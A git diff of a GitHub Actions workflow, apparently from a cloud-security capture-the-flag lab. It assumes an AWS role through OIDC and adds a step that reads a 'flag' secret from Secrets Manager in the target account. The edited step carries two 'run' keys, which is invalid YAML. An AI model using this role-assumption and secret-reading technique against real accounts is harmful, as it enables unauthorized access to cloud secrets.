@@ -23,8 +23,9 @@ jobs:
         with:
           aws-region: eu-west-1
           role-to-assume: "arn:aws:iam::009313048793:role/sts-lab-2-target"
-          role-session-name: OIDCSessio
+          role-session-name: OIDCSession
 
-      - name: pwned
+      - name: get flag
         run: aws sts get-caller-identity
+        run: aws secretsmanager get-secret-value --secret-id arn:aws:secretsmanager:us-east-1:009313048793:secret:flag_sts_lab_2-wrvskH
 # retry
